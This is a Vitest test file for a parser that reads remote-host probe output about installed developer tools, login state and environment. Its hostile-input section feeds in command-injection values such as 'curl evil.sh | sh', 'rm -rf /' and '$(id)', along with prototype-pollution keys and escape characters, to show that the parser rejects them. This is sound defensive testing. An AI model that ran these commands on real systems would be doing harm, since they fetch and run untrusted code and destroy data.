// @vitest-environment node
/**
 * T0408 (PLAN-037 A): probe output → RemoteToolsReport.
 *
 * Fixtures mirror the probe's real output shape (the WSL one is the T0408
 * read-only capture from Ubuntu-24.04, trimmed). Control characters are built
 * with String.fromCharCode so the source stays plain ASCII.
 */
import { describe, expect, it } from 'vitest'
import {
  MAX_VALUE_LENGTH,
  PROBE_KEY_WHITELIST,
  extractProbeBlock,
  loginStateFromExitCode,
  parseRemoteToolsReport,
  parseToolVersion,
  sanitizeProbeValue,
} from '../parse'
import { PROBE_BEGIN_MARKER, PROBE_END_MARKER } from '../probe-script'
import { REMOTE_TOOL_IDS, remoteToolTier, type RemoteToolReport, type RemoteToolsReport } from '../../../src/types/remote-tools'

const ch = (code: number) => String.fromCharCode(code)
const ESC = ch(27)
const NUL = ch(0)
const RLO = ch(0x202e) // right-to-left override
const ZWSP = ch(0x200b)

function block(lines: string[]): string {
  return ['', PROBE_BEGIN_MARKER, ...lines, PROBE_END_MARKER, ''].join('\n')
}

const NO_AUTH_ENV = [
  'env.auth.ANTHROPIC_API_KEY=0',
  'env.auth.CLAUDE_CODE_OAUTH_TOKEN=0',
  'env.auth.OPENAI_API_KEY=0',
  'env.auth.GH_TOKEN=0',
  'env.auth.GITHUB_TOKEN=0',
]

function missingTools(except: string[] = []): string[] {
  return REMOTE_TOOL_IDS.filter(id => !except.includes(id)).map(id => 'tool.' + id + '.state=missing')
}

function tool(report: RemoteToolsReport | null, id: string): RemoteToolReport {
  const t = report?.tools.find(x => x.id === id)
  if (!t) throw new Error('no tool ' + id)
  return t
}

function mustParse(login: string, server?: string | null): RemoteToolsReport {
  const r = parseRemoteToolsReport(login, server)
  if (!r) throw new Error('parse returned null')
  return r
}

// T0408 WSL Ubuntu-24.04 capture (login view), rc-file noise added in front.
const WSL_LOGIN = [
  'bash: cannot set terminal process group (1234): Inappropriate ioctl for device',
  'bash: no job control in this shell',
  block([
    'env.wsl=1',
    'env.timeout=1',
    'env.uname_s=Linux',
    'env.arch=x86_64',
    'env.os_id=ubuntu',
    'env.os_id_like=debian',
    'env.os_version="24.04"',
    'env.musl=0',
    'env.pkg=apt-get',
    'env.priv=passwordless',
    ...NO_AUTH_ENV,
    'tool.claude.state=missing',
    'tool.git.state=found',
    'tool.git.path=/usr/bin/git',
    'tool.git.version=git version 2.43.0',
    'tool.gh.state=missing',
    'tool.codex.state=interop',
    'tool.codex.path=/mnt/c/Users/Gower/AppData/Roaming/npm/codex',
    'tool.curl.state=found',
    'tool.curl.path=/usr/bin/curl',
    'tool.curl.version=curl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.13 zlib/1.3',
    'tool.bash.state=found',
    'tool.bash.path=/usr/bin/bash',
    'tool.bash.version=GNU bash, version 5.2.21(1)-release (x86_64-pc-linux-gnu)',
    'tool.rg.state=missing',
    'tool.uv.state=missing',
    'tool.python3.state=found',
    'tool.python3.path=/usr/bin/python3',
    'tool.python3.version=Python 3.12.3',
    'tool.node.state=interop',
    'tool.node.path=/mnt/c/nvm4w/nodejs/node',
    'tool.claude.cred=0',
    'tool.codex.cred=0',
    'tool.gh.cred=0',
  ]),
].join('\n')

const WSL_SERVER = block([
  'tool.claude.state=missing',
  'tool.git.state=found',
  'tool.git.path=/usr/bin/git',
  'tool.gh.state=missing',
  'tool.codex.state=missing',
  'tool.curl.state=found',
  'tool.curl.path=/usr/bin/curl',
  'tool.bash.state=found',
  'tool.bash.path=/usr/bin/bash',
  'tool.rg.state=missing',
  'tool.uv.state=missing',
  'tool.python3.state=found',
  'tool.python3.path=/usr/bin/python3',
  'tool.node.state=missing',
])

describe('WSL Ubuntu with Windows interop on PATH', () => {
  const r = mustParse(WSL_LOGIN, WSL_SERVER)

  it('parses the environment', () => {
    expect(r.schemaVersion).toBe(1)
    expect(r.env).toEqual({
      osFamily: 'linux',
      osId: 'ubuntu',
      osIdLike: 'debian',
      osVersion: '24.04',
      arch: 'x86_64',
      musl: false,
      pkgManager: 'apt',
      privilege: 'passwordless',
      isWsl: true,
      hasTimeout: true,
      authEnv: { ANTHROPIC_API_KEY: false, CLAUDE_CODE_OAUTH_TOKEN: false, OPENAI_API_KEY: false, GH_TOKEN: false, GITHUB_TOKEN: false },
    })
    expect(r.warnings).toEqual([])
  })

  it('classifies /mnt/<drive>/ hits as interop-only, never as installed', () => {
    expect(tool(r, 'codex')).toEqual({
      id: 'codex',
      status: 'interop-only',
      path: '/mnt/c/Users/Gower/AppData/Roaming/npm/codex',
      login: 'n/a',
      credentialFilePresent: false,
      serverVisible: false,
    })
    expect(tool(r, 'node')).toMatchObject({ status: 'interop-only', path: '/mnt/c/nvm4w/nodejs/node', login: 'n/a', serverVisible: false })
  })

  it('parses versions and server visibility', () => {
    expect(tool(r, 'git')).toEqual({ id: 'git', status: 'ok', path: '/usr/bin/git', version: '2.43.0', login: 'n/a', serverVisible: true })
    expect(tool(r, 'curl').version).toBe('8.5.0')
    expect(tool(r, 'bash').version).toBe('5.2.21')
    expect(tool(r, 'python3').version).toBe('3.12.3')
    expect(tool(r, 'claude')).toEqual({ id: 'claude', status: 'missing', login: 'n/a', credentialFilePresent: false, serverVisible: false })
    expect(r.serverViewAvailable).toBe(true)
  })

  it('reports every tool, in REMOTE_TOOL_IDS order', () => {
    expect(r.tools.map(t => t.id)).toEqual([...REMOTE_TOOL_IDS])
  })
})

describe('first install: binary in ~/.local/bin but not on the login PATH', () => {
  const r = mustParse(
    block([
      'env.uname_s=Linux',
      'env.pkg=apt-get',
      'env.priv=password-required',
      'env.wsl=0',
      'tool.claude.state=offpath',
      'tool.claude.path=/home/alice/.local/bin/claude',
      'tool.codex.state=offpath',
      'tool.codex.path=/home/alice/.local/bin/codex',
      ...missingTools(['claude', 'codex']),
      'tool.claude.cred=1',
    ]),
    block([...missingTools()]),
  )

  it('reports not-on-path with the found location and skips the login check', () => {
    expect(tool(r, 'claude')).toEqual({
      id: 'claude',
      status: 'not-on-path',
      path: '/home/alice/.local/bin/claude',
      login: 'n/a',
      credentialFilePresent: true,
      serverVisible: false,
    })
    expect(tool(r, 'codex').status).toBe('not-on-path')
    expect(r.env.privilege).toBe('password-required')
  })
})

describe('Alpine container: root, no sudo, musl', () => {
  const r = mustParse(
    block([
      'env.wsl=0',
      'env.timeout=1',
      'env.uname_s=Linux',
      'env.arch=x86_64',
      'env.os_id=alpine',
      'env.os_version=3.20.3',
      'env.musl=1',
      'env.pkg=apk',
      'env.priv=root',
      ...NO_AUTH_ENV,
      ...missingTools(),
    ]),
    null,
  )

  it('maps apk / root / musl and has no ID_LIKE', () => {
    expect(r.env).toMatchObject({ osFamily: 'linux', osId: 'alpine', osVersion: '3.20.3', musl: true, pkgManager: 'apk', privilege: 'root' })
    expect(r.env.osIdLike).toBeUndefined()
    expect(tool(r, 'curl').status).toBe('missing')
    expect(tool(r, 'bash').status).toBe('missing')
  })

  it('promotes ripgrep to required on musl only', () => {
    expect(remoteToolTier('rg', r.env)).toBe('required')
    expect(remoteToolTier('rg', { musl: false })).toBe('optional')
    expect(remoteToolTier('claude', r.env)).toBe('required')
  })

  it('without a server view: serverViewAvailable=false, nothing visible', () => {
    expect(r.serverViewAvailable).toBe(false)
    expect(r.tools.every(t => t.serverVisible === false)).toBe(true)
  })
})

describe('macOS over SSH: brew, no timeout', () => {
  const r = mustParse(
    block([
      'env.wsl=0',
      'env.timeout=0',
      'env.uname_s=Darwin',
      'env.arch=arm64',
      'env.os_id=macos',
      'env.os_version=15.1',
      'env.musl=0',
      'env.pkg=brew',
      'env.priv=password-required',
      ...NO_AUTH_ENV,
      'tool.claude.state=found',
      'tool.claude.path=/Users/bob/.local/bin/claude',
      'tool.claude.version=2.1.289 (Claude Code)',
      'tool.claude.login=0',
      'tool.git.state=found',
      'tool.git.path=/usr/bin/git',
      'tool.git.version=git version 2.39.5 (Apple Git-154)',
      'tool.gh.state=found',
      'tool.gh.path=/opt/homebrew/bin/gh',
      'tool.gh.version=gh version 2.62.0 (2024-11-14)',
      'tool.gh.login=0',
      'tool.node.state=found',
      'tool.node.path=/opt/homebrew/bin/node',
      'tool.node.version=v22.11.0',
      ...missingTools(['claude', 'git', 'gh', 'node']),
      'tool.claude.cred=0',
      'tool.gh.cred=1',
    ]),
    block([
      'tool.claude.state=missing',
      'tool.git.state=found',
      'tool.git.path=/usr/bin/git',
      'tool.gh.state=missing',
      'tool.node.state=missing',
    ]),
  )

  it('maps darwin / brew / hasTimeout=false', () => {
    expect(r.env).toMatchObject({ osFamily: 'darwin', osId: 'macos', osVersion: '15.1', arch: 'arm64', pkgManager: 'brew', hasTimeout: false })
  })

  it('logged-in claude (Keychain, no credential file) and gh', () => {
    expect(tool(r, 'claude')).toEqual({
      id: 'claude',
      status: 'ok',
      path: '/Users/bob/.local/bin/claude',
      version: '2.1.289',
      login: 'loggedIn',
      credentialFilePresent: false,
      serverVisible: false,
    })
    expect(tool(r, 'gh')).toMatchObject({ status: 'ok', version: '2.62.0', login: 'loggedIn', credentialFilePresent: true, serverVisible: false })
    expect(tool(r, 'git')).toMatchObject({ version: '2.39.5', serverVisible: true })
    expect(tool(r, 'node').version).toBe('22.11.0')
  })
})

describe('nothing installed / nothing logged in', () => {
  it('everything missing', () => {
    const r = mustParse(block(['env.uname_s=Linux', 'env.pkg=none', 'env.priv=sudo-missing', ...missingTools()]), block(missingTools()))
    expect(r.tools.every(t => t.status === 'missing' && t.serverVisible === false)).toBe(true)
    expect(r.tools.every(t => t.login === 'n/a')).toBe(true)
    expect(r.env).toMatchObject({ pkgManager: 'none', privilege: 'sudo-missing' })
  })

  it('installed but logged out (exit 1) everywhere', () => {
    const r = mustParse(
      block([
        'env.uname_s=Linux',
        'tool.claude.state=found',
        'tool.claude.path=/home/a/.local/bin/claude',
        'tool.claude.version=2.1.289 (Claude Code)',
        'tool.claude.login=1',
        'tool.codex.state=found',
        'tool.codex.path=/home/a/.local/bin/codex',
        'tool.codex.version=codex-cli 0.160.0',
        'tool.codex.login=1',
        'tool.gh.state=found',
        'tool.gh.path=/usr/bin/gh',
        'tool.gh.version=gh version 2.45.0 (2024-03-04)',
        'tool.gh.login=1',
        'tool.claude.cred=0',
        'tool.codex.cred=0',
        'tool.gh.cred=0',
      ]),
    )
    for (const id of ['claude', 'codex', 'gh']) expect(tool(r, id)).toMatchObject({ status: 'ok', login: 'loggedOut', credentialFilePresent: false })
    expect(tool(r, 'codex').version).toBe('0.160.0')
  })
})

describe('gh auth status timed out', () => {
  it('124 (timeout) → unknown; the tool itself stays ok', () => {
    const r = mustParse(
      block(['tool.gh.state=found', 'tool.gh.path=/usr/bin/gh', 'tool.gh.version=gh version 2.45.0 (2024-03-04)', 'tool.gh.login=124']),
    )
    expect(tool(r, 'gh')).toMatchObject({ status: 'ok', login: 'unknown' })
  })

  it.each([
    ['0', 'loggedIn'],
    ['1', 'loggedOut'],
    ['124', 'unknown'],
    ['137', 'unknown'],
    ['127', 'unknown'],
    ['', 'unknown'],
    [undefined, 'unknown'],
    ['0; echo pwned', 'unknown'],
  ])('exit code %j → %s', (code, state) => {
    expect(loginStateFromExitCode(code)).toBe(state)
  })
})

describe('claude version gate and broken binaries', () => {
  it('claude below HEALTHY_MIN → too-old (login still reported)', () => {
    const r = mustParse(
      block(['tool.claude.state=found', 'tool.claude.path=/usr/local/bin/claude', 'tool.claude.version=2.1.113 (Claude Code)', 'tool.claude.login=0']),
    )
    expect(tool(r, 'claude')).toMatchObject({ status: 'too-old', version: '2.1.113', login: 'loggedIn' })
  })

  it('claude exactly HEALTHY_MIN is ok', () => {
    const r = mustParse(block(['tool.claude.state=found', 'tool.claude.path=/x/claude', 'tool.claude.version=2.1.280 (Claude Code)']))
    expect(tool(r, 'claude').status).toBe('ok')
  })

  it('found on PATH but --version printed nothing → error', () => {
    const r = mustParse(block(['tool.uv.state=found', 'tool.uv.path=/x/uv', 'tool.uv.version=']))
    expect(tool(r, 'uv')).toEqual({ id: 'uv', status: 'error', path: '/x/uv', login: 'n/a', serverVisible: false })
  })

  it('unparsable version text → ok without a version', () => {
    const r = mustParse(block(['tool.claude.state=found', 'tool.claude.path=/x/claude', 'tool.claude.version=claude: something odd']))
    expect(tool(r, 'claude')).toMatchObject({ status: 'ok' })
    expect(tool(r, 'claude').version).toBeUndefined()
  })

  it.each([
    ['claude', '2.1.289 (Claude Code)', '2.1.289'],
    ['claude', '2.2.0-beta.1 (Claude Code)', '2.2.0-beta.1'],
    ['codex', 'codex-cli 0.160.0-alpha.2', '0.160.0-alpha.2'],
    ['git', 'git version 2.43.0', '2.43.0'],
    ['gh', 'gh version 2.45.0 (2024-03-04)', '2.45.0'],
    ['rg', 'ripgrep 14.1.0', '14.1.0'],
    ['uv', 'uv 0.5.2 (abc 2024-11-01)', '0.5.2'],
    ['node', 'v20.11.1', '20.11.1'],
    ['python3', 'Python 3.12.3', '3.12.3'],
    ['claude', 'not a version', undefined],
    ['git', 'git version 2.43', undefined],
  ] as const)('%s %j → %j', (id, raw, expected) => {
    expect(parseToolVersion(id, raw)).toBe(expected)
  })
})

describe('hostile / noisy output', () => {
  it('ignores everything outside the markers and uses the last complete block', () => {
    const out = [
      'tool.claude.state=found', // noise before any marker
      'tool.claude.version=9.9.9 (Claude Code)',
      PROBE_BEGIN_MARKER, // a fake block printed by an rc file
      'env.priv=root',
      'tool.git.state=found',
      PROBE_END_MARKER,
      'motd: welcome',
      block(['env.priv=password-required', ...missingTools()]),
      'tool.gh.state=found', // after END
      'logout noise',
    ].join('\n')
    const r = mustParse(out)
    expect(r.env.privilege).toBe('password-required')
    expect(tool(r, 'claude').status).toBe('missing')
    expect(tool(r, 'git').status).toBe('missing')
    expect(tool(r, 'gh').status).toBe('missing')
  })

  it('returns null without a complete block', () => {
    expect(parseRemoteToolsReport('')).toBeNull()
    expect(parseRemoteToolsReport('just noise\n')).toBeNull()
    expect(parseRemoteToolsReport(PROBE_BEGIN_MARKER + '\nenv.pkg=apt-get\n')).toBeNull() // cut before END
    expect(parseRemoteToolsReport(PROBE_END_MARKER + '\n' + PROBE_BEGIN_MARKER + '\n')).toBeNull()
  })

  it('accepts CRLF line endings and indented markers', () => {
    const out = ['  ' + PROBE_BEGIN_MARKER, 'env.pkg=dnf', 'tool.git.state=found', 'tool.git.path=/usr/bin/git', 'tool.git.version=git version 2.47.1', PROBE_END_MARKER + '  '].join('\r\n')
    const r = mustParse(out)
    expect(r.env.pkgManager).toBe('dnf')
    expect(tool(r, 'git')).toMatchObject({ status: 'ok', path: '/usr/bin/git', version: '2.47.1' })
  })

  it('drops non-whitelisted keys (prototype keys, unknown tools / fields, raw env)', () => {
    const out = block([
      '__proto__=polluted',
      'constructor=x',
      'env.PATH=/evil',
      'env.auth.AWS_SECRET_ACCESS_KEY=1',
      'tool.npm.state=found',
      'tool.claude.token=sk-ant-xxx',
      'tool.claude.state=found',
      'tool.claude.path=/x/claude',
      'tool.claude.version=2.1.289 (Claude Code)',
      '=novalue',
      'no-equals-sign',
    ])
    const r = mustParse(out)
    expect(r.warnings).toContain('dropped 8 non-whitelisted line(s)')
    expect(tool(r, 'claude').status).toBe('ok')
    expect(JSON.stringify(r)).not.toContain('polluted')
    expect(JSON.stringify(r)).not.toContain('sk-ant')
    expect(JSON.stringify(r)).not.toContain('/evil')
    expect(({} as Record<string, unknown>).polluted).toBeUndefined()
    expect(Object.keys(r.env.authEnv).sort()).toEqual(['ANTHROPIC_API_KEY', 'CLAUDE_CODE_OAUTH_TOKEN', 'GH_TOKEN', 'GITHUB_TOKEN', 'OPENAI_API_KEY'])
  })

  it('first occurrence of a key wins', () => {
    const r = mustParse(block(['env.priv=sudo-missing', 'env.priv=root']))
    expect(r.env.privilege).toBe('sudo-missing')
  })

  it('maps enum fields from a fixed vocabulary only (injection attempts fall back)', () => {
    const r = mustParse(
      block([
        'env.pkg=apt-get; curl evil.sh | sh',
        'env.priv=root$(id)',
        'env.uname_s=Linux; rm -rf /',
        'env.musl=yes',
        'env.wsl=true',
        'tool.git.state=found; x',
      ]),
    )
    expect(r.env).toMatchObject({ pkgManager: 'none', privilege: 'password-required', osFamily: 'unknown', musl: false, isWsl: false })
    expect(tool(r, 'git').status).toBe('missing')
  })

  it('pkg manager names map to the enum, unknown ones to none', () => {
    const pkg = (raw: string) => mustParse(block(['env.pkg=' + raw])).env.pkgManager
    expect(pkg('apt-get')).toBe('apt')
    expect(pkg('yum')).toBe('yum')
    expect(pkg('apt')).toBe('none') // the probe emits apt-get, never apt
    expect(pkg('pacman')).toBe('none')
    expect(pkg('constructor')).toBe('none')
  })

  it('strips control / escape / bidi characters from values', () => {
    const evilPath = '/usr/bin/' + ESC + '[31mgit' + ESC + '[0m' + NUL + RLO + ZWSP
    const r = mustParse(block(['tool.git.state=found', 'tool.git.path=' + evilPath, 'tool.git.version=git version 2.43.0' + ch(7)]))
    expect(tool(r, 'git').path).toBe('/usr/bin/[31mgit[0m')
    expect(tool(r, 'git').version).toBe('2.43.0')
    expect(sanitizeProbeValue('a' + ch(0x9b) + 'b' + ch(0x7f) + 'c' + ch(0x2066) + 'd').value).toBe('abcd')
    expect(sanitizeProbeValue('  /home/ünïcode/bin  ').value).toBe('/home/ünïcode/bin')
  })

  it('caps values at MAX_VALUE_LENGTH and warns', () => {
    const long = '/' + 'a'.repeat(400)
    const r = mustParse(block(['tool.uv.state=offpath', 'tool.uv.path=' + long]))
    expect(tool(r, 'uv').path?.length).toBe(MAX_VALUE_LENGTH)
    expect(r.warnings).toContain('value of tool.uv.path truncated to 256 chars')
    // a long version line still parses from its prefix
    const v = mustParse(block(['tool.curl.state=found', 'tool.curl.path=/usr/bin/curl', 'tool.curl.version=curl 8.5.0 ' + 'x'.repeat(500)]))
    expect(tool(v, 'curl').version).toBe('8.5.0')
  })

  it('caps the number of lines read', () => {
    const lines = Array.from({ length: 600 }, (_, i) => 'junk' + i + '=1')
    const b = extractProbeBlock(block([...lines, 'env.pkg=apk']))
    expect(b?.warnings).toContain('probe block truncated to 512 lines')
    expect(b?.values.has('env.pkg')).toBe(false)
  })

  it('a server block that is broken only clears serverViewAvailable', () => {
    const r = mustParse(WSL_LOGIN, 'garbage without markers')
    expect(r.serverViewAvailable).toBe(false)
    expect(r.tools.every(t => !t.serverVisible)).toBe(true)
    expect(r.warnings).toContain('server view: no complete probe block')
  })

  it('server view: an interop path is not "visible"', () => {
    const r = mustParse(block(missingTools()), block(['tool.codex.state=interop', 'tool.codex.path=/mnt/c/x/codex']))
    expect(tool(r, 'codex').serverVisible).toBe(false)
  })
})

describe('key whitelist', () => {
  it('contains only env.* and tool.<known id>.<known field> keys', () => {
    for (const k of PROBE_KEY_WHITELIST) expect(k).toMatch(/^(env\.[a-z_]+|env\.auth\.[A-Z_]+|tool\.(claude|git|gh|codex|curl|bash|rg|uv|python3|node)\.(state|path|version|login|cred))$/)
  })
})
